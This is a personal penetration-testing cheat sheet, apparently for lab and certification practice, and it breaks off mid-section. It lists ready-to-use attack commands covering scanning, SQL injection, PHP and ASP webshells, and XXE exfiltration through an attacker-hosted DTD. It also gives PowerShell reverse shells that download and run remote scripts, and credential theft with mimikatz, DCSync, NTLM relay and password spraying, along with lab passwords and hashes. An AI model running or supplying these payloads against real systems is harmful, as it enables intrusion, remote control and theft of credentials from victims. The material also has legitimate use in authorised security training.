# My Cheet Sheet
- [My Cheet Sheet](#my-cheet-sheet)
- [SWEEP](#sweep)
- [Port Scan](#port-scan)
  - [rustscan](#rustscan)
  - [nmap](#nmap)
  - [Powershell](#powershell)
- [Recon](#recon)
  - [Autorecon](#autorecon)
  - [SNMP](#snmp)
  - [SMB](#smb)
  - [DNS](#dns)
  - [RPC](#rpc)
  - [LDAP](#ldap)
  - [Web](#web)
    - [App](#app)
    - [subdomain](#subdomain)
    - [dir](#dir)
    - [WordPress](#wordpress)
    - [endpoint](#endpoint)
    - [POST Fuzz](#post-fuzz)
  - [enum4linux](#enum4linux)
- [Initial Access](#initial-access)
  - [Path Traversal](#path-traversal)
    - [id\_sa](#id_sa)
    - [LFI](#lfi)
  - [Webshell](#webshell)
  - [File Upload](#file-upload)
    - [XXE](#xxe)
  - [Reverse Shell](#reverse-shell)
    - [Bypass](#bypass)
  - [SQLi](#sqli)
    - [MSSQL](#mssql)
  - [ExploitDB](#exploitdb)
  - [shellcode](#shellcode)
  - [Webdav](#webdav)
  - [ldap\_shell](#ldap_shell)
  - [hash\_catch](#hash_catch)
  - [Other Bypass](#other-bypass)
- [Phishing](#phishing)
- [Foothold](#foothold)
  - [Linux](#linux-1)
    - [Background](#background)
    - [Interactiveshell](#interactiveshell)
  - [Windows](#windows-1)
    - [SHELL](#shell)
    - [Client Soft](#client-soft)
- [Credential Access](#credential-access)
  - [Brute Force](#brute-force)
  - [hashcrack](#hashcrack)
  - [Windows](#windows-2)
    - [crackmap](#crackmap)
    - [PsMapexec](#psmapexec)
    - [kerbrute](#kerbrute)
    - [mimikatz](#mimikatz)
    - [DomainPasswordSpray](#domainpasswordspray)
    - [AD](#ad)
- [Lateral Movement](#lateral-movement)
  - [NTLM Relay](#ntlm-relay)
  - [Inveigh](#inveigh)
  - [PsExec](#psexec)
  - [winRM](#winrm)
  - [DCOM](#dcom)
  - [RunasCs](#runascs)
  - [TightVNC](#tightvnc)
- [Discovery](#discovery)
  - [Windows](#windows-3)
    - [LOLBIN](#lolbin)
    - [PowerView](#powerview)
    - [winPEAS](#winpeas)
    - [Powerless](#powerless)
    - [token](#token)
    - [Sherlock](#sherlock)
    - [PrivescCheck](#privesccheck)
    - [Snaffler](#snaffler)
    - [LaZagne](#lazagne)
    - [BloodHound](#bloodhound)
    - [findDelegation](#finddelegation)
    - [cmd](#cmd)
  - [Linux](#linux-2)
    - [cmd](#cmd-1)
    - [linpeas](#linpeas)
    - [pspy](#pspy)
  - [Other](#other)
    - [git](#git)
- [Privilege Escalation](#privilege-escalation)
  - [Windows](#windows-4)
    - [PowerUp](#powerup)
    - [SharpUp](#sharpup)
    - [LOLBIN](#lolbin-1)
    - [token](#token-1)
    - [SePriv](#sepriv)
    - [PrintNightmare](#printnightmare)
    - [HiveNightmare](#hivenightmare)
    - [S4U](#s4u)
    - [ADCS](#adcs)
    - [UAC bypass](#uac-bypass)
    - [Group](#group)
    - [Other Tools](#other-tools)
  - [Linux](#linux-3)
    - [SUGGEST](#suggest)
    - [/etc/passwd](#etcpasswd)
    - [shadow](#shadow)
    - [sudoer](#sudoer)
    - [Kernel Ecpliot](#kernel-ecpliot)
    - [Cron File backup](#cron-file-backup)
- [Transfer](#transfer)
  - [Port Forwading](#port-forwading)
    - [SSH](#ssh)
    - [Chisel](#chisel)
    - [Ligolo-ng](#ligolo-ng)
  - [SMB](#smb-1)
  - [FTP](#ftp)
- [HTTP](#http)
- [Tips](#tips)
  - [list](#list)
  - [Metasploit](#metasploit)
  - [Empire](#empire)
  - [RDP admin](#rdp-admin)
  - [User-Name-List](#user-name-list)
  - [sheet](#sheet)

# SWEEP
```bash
fping -asgq 172.16.5.0/24

#nmap
nmap -sn -v 192.168.50.1-253 -oG ping-sweep.txt
```
# Port Scan
## rustscan
```bash
rustscan -a <IP> --top --ulimit 5000
```
## nmap
```bash
# TCP
# 22,21,25,389,3389,135,139,445,80,443,8080,8888,1443,5985,5986,8000
nmap -sT -n -Pn -v -A
nmap -sT -n -Pn -v --top-ports 1000 -A 192.168.50.1-254 
nmap -sT -n -Pn -v -T4 -p- -A
# UDP
nmap -sU -n -Pn -T4 -v --top-ports 500 

# SMB
# help /usr/share/nmap/scripts
nmap -p 135,139,445 -n -Pn --script smb-protocols,smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-services 
nmap -p 135,139,445 -n -Pn --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec 

# SMTP
nmap -p 25 --script smtp-enum-users,smtp-commands,smtp-ntlm-info
#POP3
nmap -p 110 --script pop3-capabilities,pop3-ntlm-info 

# LDAP
nmap -p 389 -n -Pn --script ldap-rootdse

# vuln
nmap -n -Pn --script vuln 10.10.10.248
```
## Powershell
```powershell
# on powershell
Start-Job {1..8000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.221.151", $_)) "TCP port $_ is open"} 2>$null}
Receive-Job -Id 
Stop-Job -Id 
```

# Recon
## Autorecon
```bash
source /opt/autorecon/bin/activate
autorecon <CIDR>
```

## SNMP
```bash
wget https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/master/snmpbrute.py
python3 snmpbrute.py -t 10.10.11.193

# snmpwalk
snmpwalk -c internal -v2c 10.10.11.193 
```

## SMB
```bash
# smbclient
smbclient -N -L \\\\10.129.144.138
smbclient //192.168.226.248/transfer -U htb.local/user%[HASH] --pw-nt-hash
smbclient -L //192.168.171.175 -U V.Ventz --password='HotelCalifornia194!'

timeout 300
mask ""
recurse ON
prompt OFF
mget *


# smbmap
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

## DNS
```bash
dig @192.168.192.196 matrimony.off any
dig @192.168.192.196 matrimony.off axfr
```

## RPC
```bash
rpcclient -U '' -N 10.10.11.4
rpcclient -U user --password=weasal

enumdomains
enumdomgroups
lsaquery
querydominfo
enumdomusers
```

## LDAP
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
```bash
ldapsearch -x -v -b "DC=hutch,DC=offsec" -H "ldap://192.168.215.122" "(objectclass=*)"
 | grep 'userPrincipalName:' -A 10 -B 40

ldapsearch -x -v -b "DC=hutch,DC=offsec" -D "user@hutch.offsec" -w pass -H "ldap://192.168.215.122" "(ms-MCS-AdmPwd=*)"
```

## Web
### App
```bash
# nikto
nikto -p 80 -h http://

# whatweb
whatweb -v http://
```
### subdomain
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http:// -H "Host: FUZZ. " -mc all -fs 111

gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -u http://
```
### dir
```bash
# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -recursion -recursion-depth 2 -e .aspx,.txt,.pdf,.html,.php -u http://
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -ic -e .aspx,.txt,.pdf,.html,.php -u http:// 

# dirsearch
dirsearch -u https://

# gobuster
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -k -x aspx,txt,pdf,html,php -u http://
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -k -x aspx,txt,pdf,html,php -u http://

# Dirb
dirb http://

# wordlist
comm -23 <(sort /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt) <(sort /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt)
```
### WordPress
```bash
wpscan --url http://192.168.198.244 --enumerate u
wpscan --url http://192.168.229.174 --enumerate at -t 150
wpscan --url http://192.168.198.244 --enumerate p --plugins-detection aggressive  --plugins-version-detection  aggressive -t 150
wpscan --url http://192.168.198.244 --enumerate ap --plugins-detection mixed --plugins-version-detection  aggressive -t 150

wpscan --url http://192.168.169.121/wordpress/ -U 'loly' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
```

### endpoint
```bash
# katana
katana -u http://
```

### POST Fuzz
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=FUZZ' -u http://
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -request req -u http://
```

## enum4linux
```bash
# Userenum
enum4linux -u user -p pass -U 172.16.7.3 
```

# Initial Access
https://github.com/swisskyrepo/PayloadsAllTheThings
## Path Traversal
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt
```bash
# linux
/etc/passwd

/proc/self/cmdline
/proc/1/cwd
/proc/2/environ

/home/offsec/.ssh/id_rsa
/home/offsec/.ssh/authorized_keys
/home/offsec/.ssh/known_hosts

/etc/nginx/nginx.conf
/etc/nginx/modules-enabled/default.conf
/etc/apache2/sites-enabled/000-default.conf
/opt/apache2/conf/httpd.conf
/opt/apache/conf/httpd.conf
/var/log/apache2/access.log

/etc/vsftpd.conf
/etc/knockd.conf

#Windows
/Windows/system.ini
/Windows/System32/Drivers/etc/hosts
/Users/ana/.ssh/id_rsa
```
### id_sa
```bash
chmod 400 id_key
ssh -i id_key -p 2222

ssh -i root root@localhost -o IdentitiesOnly=yes
```
```bash
ssh-keygen -t rsa
mv id_rsa.pub authorized_keys
chmod 400 id_rsa
```
### LFI
```php
# page=...

php://filter/resource=admin.php
php://filter/convert.base64-encode/resource=admin.php

data://text/plain;base64,<base64>&cmd=ls

# EXEC
/tmp
/var/crash
/dev/shm
```
## Webshell
/usr/share/webshells
```php
<?php echo(system($_GET["cmd"])); ?>
<?php echo(shell_exec($_GET["cmd"])); ?>
<?php echo(exec($_GET["cmd"]));?>
```
```asp
<% eval request('cmd') %>
```
## File Upload
htaccess
```bash
echo "AddType application/x-httpd-php .tak" > .htaccess
```
polyglot
```
exiftool -Comment='<?php echo "START\n"; echo(exec($_GET["cmd"])); echo "\nEND"; ?>' unnamed.jpg -o polyglot.php
```
Wordpress <br/>
https://github.com/p0dalirius/Wordpress-webshell-plugin
### XXE
```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
#### DTD
malicious.dtd
```xml:malicious.dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.1/?x=%file;'>">
%eval;
%exfil;
```
payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

#### SVG Image
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
## Reverse Shell
https://www.revshells.com/
<br/>
https://tex2e.github.io/reverse-shell-generator/index.html
### Bypass
```bash
w'h'o'am'i
w"h"o"am"i
```
#### Linux
```bash
# /
${PATH:0:1}
${PWD:0:1}
# white
${IFS}
$9
# ;
${LS_COLORS:10:1}
```
#### Windows
```powershell
# \
$env:HOMEPATH[0]

```
## SQLi
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection <br/>
https://portswigger.net/web-security/sql-injection/cheat-sheet
```bash
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //

# colum
' ORDER BY 1-- //
' or 1=1 order by 6 #
' UNION SELECT database(), user(), @@version, null, null -- //
' union select 1,group_concat(schema_name),3,4,5,6 FROM information_schema.schemata #
' UNION SELECT null, username, password, description, null FROM users -- //
```
### MSSQL
#### Inject
```
test' union select 1,@@version,3,4,5,6--
test' union select 1,DB_NAME(),3,4,5,6--
test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')--
test' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users--
```
#### inLine
https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

# help
help

# xp_cmdshell
enable_xp_cmdshell

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# NTLM
responder -I tun0 
cd /usr/share/responder/logs

xp_dirtree '\\10.10.14.23\any\thing'

SELECT name FROM master.dbo.sysdatabases;
USE master
exec master.dbo.xp_dirtree '\\10.10.14.23\relay'
EXEC master..xp_subdirs '\\10.10.14.23\anything\'
EXEC master..xp_fileexist '\\10.10.14.23\anything\'

# Enum
SELECT name FROM master.dbo.sysdatabases;
USE [DBname];
SELECT * FROM [DBname].INFORMATION_SCHEMA.TABLES;
```

## ExploitDB
```bash
searchsploit -m 42031
```
## shellcode
https://shell-storm.org/shellcode/index.html
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python 
```
## Webdav
```bash
cadaver http://
```

## ldap_shell
https://github.com/PShlyundin/ldap_shell
```bash
ldap_shell nara-security.com/TRACY.WHITE:zqwj041FGX

TRACY.WHITE# add_user_to_group TRACY.WHITE 'REMOTE ACCESS'
```

## hash_catch
scf, Library-ms, url, lnk
```bash
wget https://raw.githubusercontent.com/xct/hashgrab/main/hashgrab.py
python3 hashgrab.py MY_IP test
```
odt
```bash
pip install ezodf
wget https://github.com/rmdavy/badodf/raw/master/badodt.py
python3 badodt.py
```
crackmapexec
```bash
crackmapexec smb 172.16.117.3 -u  -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
```

## Other Bypass
```bash
X-Forwarded-For: 127.0.0.1
```

# Phishing
webdav
```bash
# webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/work/webdav
# sendmail
swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.232.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap  
```
shellter
```bash
shellter
```

# Foothold
## Linux
### Background
```bash
nohup python3  &
```
### Interactiveshell
```bash
# 仮想tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg 
export TERM=xterm
export SHELL=/bin/bash
reset
```
## Windows
### SHELL
```powershell
#nc.exe
cmd.exe /c powershell 

powershell -nop -c "iwr -Uri http://192.168.45.218/nc.exe -Outfile C:\Windows\temp\nc.exe"
C:\Windows\temp\nc.exe 192.168.45.218 4444 -e powershell

# Invoke-PowerShellTcp
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 4444"

# powercat
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.185/powercat.ps1');powercat -c 192.168.45.185 -p 4444 -e powershell"

# Unrestricted
powershell -ep bypass
Set-ExecutionPolicy Bypass -Force
```
### Client Soft
```bash
# SMB
impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
smbclient -U tyler \\\\test\\share
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234

# psexec
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
# wmiexec
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
# dcomexec
impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
impacket-dcomexec -object ShellWindows active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand -no-output
impacket-dcomexec -object ShellBrowserWindow active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand

# evil-winrm
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
# atexec
impacket-atexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e'

## double hop
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\backup', $SecPassword)
get-domainuser -spn -credential $Cred
```


# Credential Access
## Brute Force
```bash
# hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.50.202
hydra -L /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt ftp://192.168.50.202 -f
hydra  -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://192.168.175.47 -t 4

# hydra for HTTP
hydra -l admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.172.61 http-get /login -f
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403' -f

# mdusa
sed 's/^/:/' /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt > postgres-defaultpasslist.txt
medusa -C postgres-defaultpasslist.txt -h 192.168.175.47 -M postgres -n 5432 
medusa -h 192.168.168.108 -u postgres -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -M postgres -n 5432
```
## hashcrack
```bash
# MD5-RAW: 0, SHA-256: 1400, NTLM: 1000, NetNTLMv2: 5600, AS-REP: 18200, TGS-REP: 13100
hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --rules /usr/share/john/rules/best64.rule hash.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt --rules /usr/share/john/rules/best64.rule hash
```
## Windows
### crackmap
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth --loggedon-users
crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute

# GPP
## gpp-decryp cmd
crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
```
### PsMapexec
```powershell
wget https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/PsMapExec.ps1')

PsMapExec -Targets All -Domain htb.local -Method SMB -Username user -Hash 9a3121977ee93af56ebd0ef4f527a35e -Command "whoami"
```
### kerbrute
```bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /usr/share/seclists/Usernames/Names/names.txt

kerbrute passwordspray ./userlist Password123! --dc 10.10.10.248 -d active.htb 
```
### mimikatz
```powershell
cd /opt/mimikatz/x64

# PTH
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
#PTT
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
.\mimikatz.exe "privilege::debug" "kerberos::ptt c:\ticket\folder" "exit"

# silver ticket
whoami /user
.\mimikatz.exe "kerberos::golden /domain:htb.local /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:Administrator" "exit"

# golden ticket
whoami /user
.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /user:Administrator /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"

# lsadump
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /all /domain:htb.local" "exit"
```
### DomainPasswordSpray
```powershell
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/DomainPasswordSpray.ps1')

Invoke-DomainPasswordSpray -Password Winter2022 -ErrorAction SilentlyContinue
```
### AD
#### impacket
```bash
# AS-REP
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/user:pass
impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.txt -format john -outputfile outhash.txt

# kerberoasting
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
```
##### DCsync - secretsdump
https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
```bash
impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc
impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm

# SAM
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
# ntds.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
```

#### Rubeus
```bash
# Unconstrained Delegate
# Ticket monitoring
.\Rubeus.exe monitor /interval:5 /nowrap
#PTT
.\Rubeus.exe asktgs /ticket:BASE64 /service:cifs/dc01.INLANEFREIGHT.local /ptt 
# TGT renew
.\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap

# Constrained Delegate
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
## HTTP
Enter-PSSession ws01.inlanefreight.local


# PTT
## Sacrificial Process 
.\Rubeus.exe createnetonly /program:powershell.exe /show
## Ticket list 
.\Rubeus.exe triage
## Ticket Extracting
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
.\Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt

# AS-REP
.\Rubeus.exe asreproast /nowrap /dc:

# Kerberoasting
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
# RC4
.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
```


# Lateral Movement
## NTLM Relay 
```bash
# Enum target SMB
crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
# Responder
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" /etc/responder/Responder.conf
responder -I tun0

# ntlmrelayx
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
impacket-ntlmrelayx -smb2support -tf relayTargets.txt -c

# socks
impacket-ntlmrelayx -smb2support -tf relayTargets.txt -socks
```
## Inveigh
```powershell
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
Start-Job {Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y}
Start-Job {Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y}


wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.10/Inveigh-net4.6.2-v2.0.10.zip
unzip Inveigh-net4.6.2-v2.0.10.zip
Start-Job {.\Inveigh.exe -Console 5 -NBNS y -FileOutput y -LogOutput y}
Receive-Job -Id
Stop-Job -Id 
```
## PsExec
```powershell
wget https://download.sysinternals.com/files/PSTools.zip

.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

wget https://github.com/maaaaz/impacket-examples-windows/raw/master/psexec.exe
.\psexec.exe htb.local/tom_admin@10.10.164.146 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# OTH
net use \\files04
.\PsExec64.exe \\PC1 cmd --accepteula
```
## winRM
```powershell
# winrm
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

# winrs 
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e "

# restrict ticket on host RDP
.\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:
Enter-PSSession SRV02.oscp.exam -Authentication Negotiate
```
## DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e   ","7")

$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)
```
## RunasCs
https://github.com/antonioCoco/RunasCs
```powershell
.\RunasCs.exe username password cmd.exe -r 10.10.14.83:7777
```
## TightVNC
https://github.com/frizb/PasswordDecrypts
```bash
reg query HKLM\SOFTWARE\TightVNC\Server /s
echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

# Linux
apt-get install xtightvncviewer
echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
```

# Discovery
## Windows
### LOLBIN
```powershell
Import-Module ActiveDirectory

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
### PowerView
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon <br/>
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
```powershell
cd /usr/share/windows-resources/powersploit/Recon/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')

# cmd
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol
Get-NetSession -Verbose -ComputerName web04 

Get-LocalGroupMember Administrators
Find-LocalAdminAccess
Find-DomainUserLocation
Invoke-UserHunter
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# discription
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
# AS-REP-roastable
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
# Kerberoastable
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof
Invoke-Kerberoast

# Delegation 
## 制約なし
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" 
## 制約ある
Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol,msds-allowedtodelegateto

# GenericAll to User
$geneall = Get-ObjectAcl -Identity "UserName" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $geneall

# DCSync
$dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $dcsync
```
### winPEAS
```powershell
# on nc.exe
cd /usr/share/peass/winpeas
iwr -Uri http:// -Outfile winPEASany.exe
# on powershell
iwr -Uri http:// -Outfile winPEAS.bat
```
### Powerless
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
```powershell
wget https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat
```
### token
```powershell
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```
### Sherlock
https://github.com/rasta-mouse/Sherlock
```powershell
